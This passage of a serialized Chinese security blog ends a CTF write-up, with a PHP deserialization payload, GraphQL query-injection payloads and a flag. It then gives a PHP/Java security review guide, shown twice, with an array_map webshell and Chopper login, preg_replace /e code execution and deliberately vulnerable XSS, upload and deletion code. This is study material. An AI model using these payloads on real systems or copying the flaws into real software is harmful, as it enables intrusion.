class=\"string\">&quot;var&quot;</span>;r:<span class=\"number\">1</span>;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;N;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-ezAPI\"><a href=\"#4-ezAPI\" class=\"headerlink\" title=\"4.ezAPI\"></a>4.ezAPI</h2><p>进去后访问<a class=\"link\"   href=\"http://www.zip获取源码/\" >www.zip获取源码<i class=\"fas fa-external-link-alt\"></i></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        &lt;center&gt;</span><br><span class=\"line\">            &lt;h1&gt;Search Page&lt;/h1&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;hr&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            请输入用户ID: </span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;</span><br><span class=\"line\">            &lt;/form&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$id = $_POST[&#x27;id&#x27;];</span><br><span class=\"line\">function waf($str)&#123;</span><br><span class=\"line\">    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足</span><br><span class=\"line\">        return False;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return True;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function send($data)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $options = array(</span><br><span class=\"line\">        &#x27;http&#x27; =&gt; array(</span><br><span class=\"line\">            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,</span><br><span class=\"line\">            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,</span><br><span class=\"line\">            &#x27;content&#x27; =&gt; $data,</span><br><span class=\"line\">            &#x27;timeout&#x27; =&gt; 10 * 60</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">    $context = stream_context_create($options);</span><br><span class=\"line\">    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);</span><br><span class=\"line\">    return $result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($id))&#123;</span><br><span class=\"line\">    if(waf($id))&#123;</span><br><span class=\"line\">        isset($_POST[&#x27;data&#x27;]) ? $data=$_POST[&#x27;data&#x27;] : $data=&#x27;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#x27;.$id.&#x27;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#x27;;</span><br><span class=\"line\">        $res = json_decode(send($data));</span><br><span class=\"line\">        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;</span><br><span class=\"line\">            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;</span><br><span class=\"line\">            var_dump($res-&gt;data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里给一篇graphQL的资料</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/wy_97/article/details/110522150\" >https://blog.csdn.net/wy_97/article/details/110522150<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句</p>\n<p>用内省查询获取所以数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n  __schema &#123;\\n  types &#123;\\n name  \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png\"\n                        alt=\"图片-1665405825041\"\n                 ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</span><br></pre></td></tr></table></figure>"},{"title":"PHP / JAVA复习指南","date":"2022-11-03T15:51:24.000Z","excerpt":"PHP / JAVA复习指南","_content":"\n# PHP / JAVA复习指南\n\n## PHP\n\n### 1.php 命令执行函数以及函数应用场景\n\n- `system()` 将字符串作为OS命令执行，自带输出功能。\n- `passthru()`将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。\n- `exec()`将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。\n- `shell_exec` 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容\n- `popen()/proc_open()`该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。需要用**<u>fread</u>**来读\n- `反引号 ` [``]反引号里面的代码也会被当作OS命令来执行\n\n### 2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？\n\nphp封装协议又称为伪协议，主要分为以下几种：\n\n- `file://`  file:// 用于访问本地文件系统它在双off的情况下也可以正常使用；allow_url_fopen ：off/on allow_url_include：off/on\n\n- `php://filter` 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了在双off的情况下也可以正常使用；\n\n- `php://input` 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据allow_url_fopen ：off/on\n\n  allow_url_include：on\n\n- `zip:// compress.bzip:// compress.zlib://`均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。双off也能用\n\n- `data://` 数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。必须要双on才可以\n\n- `phar:/`/ 反序列化有时会用到 与zip协议不同的是zip协议为绝对路径，而phar协议为相对路径\n\n### 3.代码执行函数\n\n- `preg_replace()` 在php 5.6及之前的版本，当第一个参数在 /e 的修饰下，并且 magic_quotes_gpc=Off 时，函数的第二个参数会被当做php代码执行\n\n  ```\n  <?php\n  \tpreg_replace('/<php>(.*?)' . $_GET['reg'], '\\\\1' ,'<php>phpinfo()<php>');\n  \tpreg_replace('/anything/e', $_GET['test'], 'anything_test');\n  \tpreg_replace('/<php>(.*?)<\\/php>/e', '\\\\1', $_GET['test']);\n  ```\n\n- `array_map()` 第一个参数是回调函数，第二参数是函数的参数\n\n  ```\n  <?php\n      $func=$_GET['func'];\n      $cmd=$_POST['cmd'];\n      $array[0]=$cmd;\n      $new_array=array_map($func,$array);\n      echo $new_array;\n  ?>\n  //    命令执行http://localhost/123.php?func=system   cmd=whoami\n   //   菜刀连接http://localhost/123.php?func=assert   密码：cmd\n  ```\n\n  \n\n- `assert()` 判断一个表达式是否成立，能够把字符组成的字符串，当作代码执行。\n\n  > assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结\n\n### 4.php 中常见的文件读取/写入函数\n\n共有9个文件读取函数\n\n```\nfile_get_contents   // *\nfread\nfgets\nfgetss\nfile\nparse_ini_file\nreadfile    // *\nhighlight_file  // *\nshow_source // *\n```\n\n使用方法\n\n```php\n<?php\n\n// file_get_contents\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file_get_contents').PHP_EOL);\necho file_get_contents('flag.txt');\necho PHP_EOL;\n\n// fopen fread\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fread').PHP_EOL);\n$file = fopen(\"flag.txt\",\"rb\");\necho fread($file,1024);     // 参数为 resource 类型\nfclose($file);\necho PHP_EOL;\n\n// fopen fgets\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgets').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");      \necho fgets($file, 4096);        // 过滤掉了 HTML 和 PHP 标签\nfclose($file);\necho PHP_EOL;\n\n// fopen fgetss\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgetss').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");     \necho fgetss($file, 4096);        // 过滤掉了 HTML 和 PHP 标签\nfclose($file);\necho PHP_EOL;\n\n// readfile\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'readfile').PHP_EOL);\necho readfile(\"flag.txt\");      // 看到不仅输出了所有内容，而且还输出了总共长度\necho PHP_EOL;\n\n// file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file').PHP_EOL);\nprint_r(file('flag.txt'));      // 读取结果为数组，所以需要用 print_r 或 var_dump \necho PHP_EOL;\n\n// parse_ini_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'parse_ini_file').PHP_EOL);\necho parse_ini_file(\"flag.txt\");        // 只能读取 ini 配置文件\necho PHP_EOL;\n\n// show_source\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'show_source').PHP_EOL);\nshow_source('flag.txt');\necho PHP_EOL;\n\n// highlight_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'highlight_file').PHP_EOL);\nhighlight_file('flag.txt');\necho PHP_EOL;\n\n\n?>\n\n```\n\n在PHP中使用 fweite() 和file_put_contents()函数向文件中写入数据。\n\n```php\n<?php\n$file = fopen(\"test.txt\",\"w\");\necho fwrite($file,\"Hello World. Testing!\");\nfclose($file);\n?>\n\n<?php\necho file_put_contents(\"test.txt\",\"Hello World. Testing!\");\n?>\n```\n\n\n\n### 5.php 文件包含方法以及区别\n\n- `include`\n\n  ```\n  <?php include 'test.php';?>\n  ```\n\n- `include_once`  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题\n\n- `require` 与include方法基本一样\n\n- `require_once`   require_once 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件\n\n区别\n\n> 1、include如果碰到错误，会给出提示，并继续向下执行；而require会终止程序执行。2、require_once和include_once中如果包含的文件已经被包含过，就不会再次包含，但include和require会。\n\n\n\n### 6.php反序列化漏洞涉及函数\n\n- `serialize()`  序列化：把对象转化为二进制的字符串\n\n- `unserialize()` 反序列化：把对象转化的二进制字符串再转化为对象\n\n- 魔术方法 可能在某些情况下自动调用\n\n  ```\n  1.__construct()，类的构造函数\n  \n  2.__destruct()，类的析构函数\n  \n  3.__call()，在对象中调用一个不可访问方法时调用\n  \n  4.__callStatic()，用静态方式中调用一个不可访问方法时调用\n  \n  5.__get()，获得一个类的成员变量时调用\n  \n  6.__set()，设置一个类的成员变量时调用\n  \n  7.__isset()，当对不可访问属性调用isset()或empty()时调用\n  \n  8.__unset()，当对不可访问属性调用unset()时被调用。\n  \n  9.__sleep()，执行serialize()时，先会调用这个函数\n  \n  10.__wakeup()，执行unserialize()时，先会调用这个函数\n  \n  11.__toString()，类被当成字符串时的回应方法\n  \n  12.__invoke()，调用函数的方式调用一个对象时的回应方法\n  \n  13.__set_state()，调用var_export()导出类时，此静态方法会被调用。\n  \n  14.__clone()，当对象复制完成时调用\n  \n  15.__autoload()，尝试加载未定义的类\n  \n  16.__debugInfo()，打印所需调试信息\n  ```\n\n### 7.php 常见数组及引用\n\n- `$_GET` 预定义的 $_GET 变量用于收集来自 method=\"get\" 的表单中的值。\n\n  从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制\n\n- `$POST`预定义的 $_POST 变量用于收集来自 method=\"post\" 的表单中的值。\n\n  从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。\n\n- `$_REQUEST` 既可以接收$_GET又可以接收$POST的值\n\n- `$_FILES` 上传文件信息\n\n- `$_COOKIE`用于获取 cookie 的值。\n\n- `$SESSION`读取Session变量信息\n\n## JAVA\n\n### 1.Web服务器\n\n常见的java EE web服务器\n\n**tomcat   jetty  resin**\n\n专业级java EE web 服务器\n\n**JBOSS   GlassFish   Weblogic   Webshpere**\n\n\n\n常见漏洞\n\nhttps://zhuanlan.zhihu.com/p/399939177\n\n### 2.tomcat目录结构与功能\n\n- `bin`:目录里主要是有启动和关闭应用服务器的bat批处理命令；\n- `conf`:这个目录里主要是支持配置Tomcat的文件。\n- `lib`:这里面是支持Tomcat启动的jar包，当然也可以放你自己项目需要的jar包。\n- `temp`:Tomcat运行过程中产生的临时文件。\n- `webapps`:这里就是你的项目了，你的项目可以是以文件或者jar包的方式存放在这个目录里。\n- `work`：work目录用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。 \n\n\n\n### 3.tomcat中web.xml 与 tomcat_user.xml 的作用\n\n`web.xml`\nTomcat可以让用户通过将缺省的web.xml放入conf目录中来定义所有关系环境的web.xml的缺省值.建立一个新的关系环境时,Tomcat使用缺省的web.xml文件作为基本设置和应用项目特定的web.xml(放在应用项目的WEB-INF/web.xml文件)来覆盖这些缺省值.是配置整个tomcat的jsp和servlet工作中的一些情况,比如我们配置list来不让我们输入一个目录的时候显示出那个目录下的jsp文件,而是显示404错误.还有在一些安全方面也可以做配置.\n\n`tomcat-users.xml`\n 配置tomcat的用户了信息.可以到tomcat的开始页http://localhost:8080中点tomcat manager就会提示你要用户名和密码了,这里的用户名和密码就可以在这个xml中配置的\n\n\n\n### 4.什么是jsp\n\n> JSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以<%开头以%>结束。\n>\n> JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。\n>\n> JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。\n>\n> JSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。\n\n\n\n### 5.java 代码审计xss\n\n```\n前端反射型xss   (name参数可控) \n<%\nString name = request.getParameter(\"name\");\nout.println(name)\n%>\n后端反射型 xss  (msg参数可控) \npublic void Message(HttpServletRequest req, HttpServletResponse resp) {\n\tString message = req.getParameter(\"msg\");\ntry{\n\tresp.getWriter().print(message);\n} catch (IOException e) {\n\te. printStackTrace();\n}\nDOM xss只发生在客户端处理数据阶段，未经过滤被传入存在缺陷的JavaScript代码处理。\n<script>\n    var pos = document.URL.indexOf(\"#\")+1;\n    var name = document.URL.substring(pos, document.URL.length);\n    document.write(name);\neval(\"var a = \" + name);\n</script>\n储存型xss 会通过JDBC与数据库交互\n```\n\n\n\n### 6.Java 常用的文件操作方法\n\n```\nFiles.readAllBytes、Files.readAllLines\nFileInputStream\nFileOutputStream\nFile\nFileUtils\nIOUtils\nBufferedReader\nServletFileUpload\nMultipartFile\nCommonsMultipartFile\nPrintWriter\nZipInputStream\nZipEntry.getSize\n```\n\n\n\n### 7.文件上传关键函数\n\n```\nDiskFileItemFactory@MultipartConfigMultipartFileFile\nUpload\nInputStream\nOutputStream\nwrite\nfileName\nfilePath\n```\n\n\n\n### 8.servlet文件上传函数\n\n> servlet3之前\n> 使用commons-fileupload、commons-io这两个jar包来处理文件上传\n>\n> servlet3之后\n> 使用request.getParts()获取上传文件\n\n\n\n### 9.java任意文件上传\n\n```\nprivate boolean uploadWithAnnotation(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {\n    Part part = request.getPart(\"fileName\");\n    if(part == null) {\n      return false;\n    }\n    String filename = UPLOAD_PATH + File.separator + part.getSubmittedFileName();\n    part.write(filename);\n    part.delete();\n    return true;\n}\n```\n\n\n\n### 10.任意文件删除\n\n```\nString filename = request.getParameter(\"filename\");\nFile file = new File(filename);\nif(file != null && file.exists() && file.delete()) {\n  \tresponse.getWriter().println(\"delete success\");\n} else {\n  \tresponse.getWriter().println(\"delete failed\");\n}\n```","source":"_posts/PHP  JAVA复习指南.md","raw":"---\ntitle: PHP / JAVA复习指南\ndate: 2022-11-03 23:51:24\nexcerpt: PHP / JAVA复习指南\ncategories: 学习\n---\n\n# PHP / JAVA复习指南\n\n## PHP\n\n### 1.php 命令执行函数以及函数应用场景\n\n- `system()` 将字符串作为OS命令执行，自带输出功能。\n- `passthru()`将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。\n- `exec()`将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。\n- `shell_exec` 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容\n- `popen()/proc_open()`该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。需要用**<u>fread</u>**来读\n- `反引号 ` [``]反引号里面的代码也会被当作OS命令来执行\n\n### 2.php伪协议以及各个伪协议的应用场景以及应用的条件是什么？需要php.ini中进行怎样的配置？\n\nphp封装协议又称为伪协议，主要分为以下几种：\n\n- `file://`  file:// 用于访问本地文件系统它在双off的情况下也可以正常使用；allow_url_fopen ：off/on allow_url_include：off/on\n\n- `php://filter` 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了在双off的情况下也可以正常使用；\n\n- `php://input` 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据allow_url_fopen ：off/on\n\n  allow_url_include：on\n\n- `zip:// compress.bzip:// compress.zlib://`均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。双off也能用\n\n- `data://` 数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。必须要双on才可以\n\n- `phar:/`/ 反序列化有时会用到 与zip协议不同的是zip协议为绝对路径，而phar协议为相对路径\n\n### 3.代码执行函数\n\n- `preg_replace()` 在php 5.6及之前的版本，当第一个参数在 /e 的修饰下，并且 magic_quotes_gpc=Off 时，函数的第二个参数会被当做php代码执行\n\n  ```\n  <?php\n  \tpreg_replace('/<php>(.*?)' . $_GET['reg'], '\\\\1' ,'<php>phpinfo()<php>');\n  \tpreg_replace('/anything/e', $_GET['test'], 'anything_test');\n  \tpreg_replace('/<php>(.*?)<\\/php>/e', '\\\\1', $_GET['test']);\n  ```\n\n- `array_map()` 第一个参数是回调函数，第二参数是函数的参数\n\n  ```\n  <?php\n      $func=$_GET['func'];\n      $cmd=$_POST['cmd'];\n      $array[0]=$cmd;\n      $new_array=array_map($func,$array);\n      echo $new_array;\n  ?>\n  //    命令执行http://localhost/123.php?func=system   cmd=whoami\n   //   菜刀连接http://localhost/123.php?func=assert   密码：cmd\n  ```\n\n  \n\n- `assert()` 判断一个表达式是否成立，能够把字符组成的字符串，当作代码执行。\n\n  > assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结\n\n### 4.php 中常见的文件读取/写入函数\n\n共有9个文件读取函数\n\n```\nfile_get_contents   // *\nfread\nfgets\nfgetss\nfile\nparse_ini_file\nreadfile    // *\nhighlight_file  // *\nshow_source // *\n```\n\n使用方法\n\n```php\n<?php\n\n// file_get_contents\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file_get_contents').PHP_EOL);\necho file_get_contents('flag.txt');\necho PHP_EOL;\n\n// fopen fread\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fread').PHP_EOL);\n$file = fopen(\"flag.txt\",\"rb\");\necho fread($file,1024);     // 参数为 resource 类型\nfclose($file);\necho PHP_EOL;\n\n// fopen fgets\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgets').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");      \necho fgets($file, 4096);        // 过滤掉了 HTML 和 PHP 标签\nfclose($file);\necho PHP_EOL;\n\n// fopen fgetss\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgetss').PHP_EOL);\n$file = fopen(\"flag.txt\",\"r\");     \necho fgetss($file, 4096);        // 过滤掉了 HTML 和 PHP 标签\nfclose($file);\necho PHP_EOL;\n\n// readfile\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'readfile').PHP_EOL);\necho readfile(\"flag.txt\");      // 看到不仅输出了所有内容，而且还输出了总共长度\necho PHP_EOL;\n\n// file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'file').PHP_EOL);\nprint_r(file('flag.txt'));      // 读取结果为数组，所以需要用 print_r 或 var_dump \necho PHP_EOL;\n\n// parse_ini_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'parse_ini_file').PHP_EOL);\necho parse_ini_file(\"flag.txt\");        // 只能读取 ini 配置文件\necho PHP_EOL;\n\n// show_source\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'show_source').PHP_EOL);\nshow_source('flag.txt');\necho PHP_EOL;\n\n// highlight_file\nprint(sprintf(\"%'-10s%-'-30s\", '-', 'highlight_file').PHP_EOL);\nhighlight_file('flag.txt');\necho PHP_EOL;\n\n\n?>\n\n```\n\n在PHP中使用 fweite() 和file_put_contents()函数向文件中写入数据。\n\n```php\n<?php\n$file = fopen(\"test.txt\",\"w\");\necho fwrite($file,\"Hello World. Testing!\");\nfclose($file);\n?>\n\n<?php\necho file_put_contents(\"test.txt\",\"Hello World. Testing!\");\n?>\n```\n\n\n\n### 5.php 文件包含方法以及区别\n\n- `include`\n\n  ```\n  <?php include 'test.php';?>\n  ```\n\n- `include_once`  可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题\n\n- `require` 与include方法基本一样\n\n- `require_once`   require_once 语句时会先检查要包含的文件是不是已经在该程序中的其他地方被包含过，如果有，则不会再次重复包含该文件\n\n区别\n\n> 1、include如果碰到错误，会给出提示，并继续向下执行；而require会终止程序执行。2、require_once和include_once中如果包含的文件已经被包含过，就不会再次包含，但include和require会。\n\n\n\n### 6.php反序列化漏洞涉及函数\n\n- `serialize()`  序列化：把对象转化为二进制的字符串\n\n- `unserialize()` 反序列化：把对象转化的二进制字符串再转化为对象\n\n- 魔术方法 可能在某些情况下自动调用\n\n  ```\n  1.__construct()，类的构造函数\n  \n  2.__destruct()，类的析构函数\n  \n  3.__call()，在对象中调用一个不可访问方法时调用\n  \n  4.__callStatic()，用静态方式中调用一个不可访问方法时调用\n  \n  5.__get()，获得一个类的成员变量时调用\n  \n  6.__set()，设置一个类的成员变量时调用\n  \n  7.__isset()，当对不可访问属性调用isset()或empty()时调用\n  \n  8.__unset()，当对不可访问属性调用unset()时被调用。\n  \n  9.__sleep()，执行serialize()时，先会调用这个函数\n  \n  10.__wakeup()，执行unserialize()时，先会调用这个函数\n  \n  11.__toString()，类被当成字符串时的回应方法\n  \n  12.__invoke()，调用函数的方式调用一个对象时的回应方法\n  \n  13.__set_state()，调用var_export()导出类时，此静态方法会被调用。\n  \n  14.__clone()，当对象复制完成时调用\n  \n  15.__autoload()，尝试加载未定义的类\n  \n  16.__debugInfo()，打印所需调试信息\n  ```\n\n### 7.php 常见数组及引用\n\n- `$_GET` 预定义的 $_GET 变量用于收集来自 method=\"get\" 的表单中的值。\n\n  从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送信息的量也有限制\n\n- `$POST`预定义的 $_POST 变量用于收集来自 method=\"post\" 的表单中的值。\n\n  从带有 POST 方法的表单发送的信息，对任何人都是不可见的（不会显示在浏览器的地址栏），并且对发送信息的量也没有限制。\n\n- `$_REQUEST` 既可以接收$_GET又可以接收$POST的值\n\n- `$_FILES` 上传文件信息\n\n- `$_COOKIE`用于获取 cookie 的值。\n\n- `$SESSION`读取Session变量信息\n\n## JAVA\n\n### 1.Web服务器\n\n常见的java EE web服务器\n\n**tomcat   jetty  resin**\n\n专业级java EE web 服务器\n\n**JBOSS   GlassFish   Weblogic   Webshpere**\n\n\n\n常见漏洞\n\nhttps://zhuanlan.zhihu.com/p/399939177\n\n### 2.tomcat目录结构与功能\n\n- `bin`:目录里主要是有启动和关闭应用服务器的bat批处理命令；\n- `conf`:这个目录里主要是支持配置Tomcat的文件。\n- `lib`:这里面是支持Tomcat启动的jar包，当然也可以放你自己项目需要的jar包。\n- `temp`:Tomcat运行过程中产生的临时文件。\n- `webapps`:这里就是你的项目了，你的项目可以是以文件或者jar包的方式存放在这个目录里。\n- `work`：work目录用来存放tomcat在运行时的编译后文件，例如JSP编译后的文件。 \n\n\n\n### 3.tomcat中web.xml 与 tomcat_user.xml 的作用\n\n`web.xml`\nTomcat可以让用户通过将缺省的web.xml放入conf目录中来定义所有关系环境的web.xml的缺省值.建立一个新的关系环境时,Tomcat使用缺省的web.xml文件作为基本设置和应用项目特定的web.xml(放在应用项目的WEB-INF/web.xml文件)来覆盖这些缺省值.是配置整个tomcat的jsp和servlet工作中的一些情况,比如我们配置list来不让我们输入一个目录的时候显示出那个目录下的jsp文件,而是显示404错误.还有在一些安全方面也可以做配置.\n\n`tomcat-users.xml`\n 配置tomcat的用户了信息.可以到tomcat的开始页http://localhost:8080中点tomcat manager就会提示你要用户名和密码了,这里的用户名和密码就可以在这个xml中配置的\n\n\n\n### 4.什么是jsp\n\n> JSP全称Java Server Pages，是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。标签通常以<%开头以%>结束。\n>\n> JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。\n>\n> JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。\n>\n> JSP标签有多种功能，比如访问数据库、记录用户选择信息、访问JavaBeans组件等，还可以在不同的网页中传递控制信息和共享信息。\n\n\n\n### 5.java 代码审计xss\n\n```\n前端反射型xss   (name参数可控) \n<%\nString name = request.getParameter(\"name\");\nout.println(name)\n%>\n后端反射型 xss  (msg参数可控) \npublic void Message(HttpServletRequest req, HttpServletResponse resp) {\n\tString message = req.getParameter(\"msg\");\ntry{\n\tresp.getWriter().print(message);\n} catch (IOException e) {\n\te. printStackTrace();\n}\nDOM xss只发生在客户端处理数据阶段，未经过滤被传入存在缺陷的JavaScript代码处理。\n<script>\n    var pos = document.URL.indexOf(\"#\")+1;\n    var name = document.URL.substring(pos, document.URL.length);\n    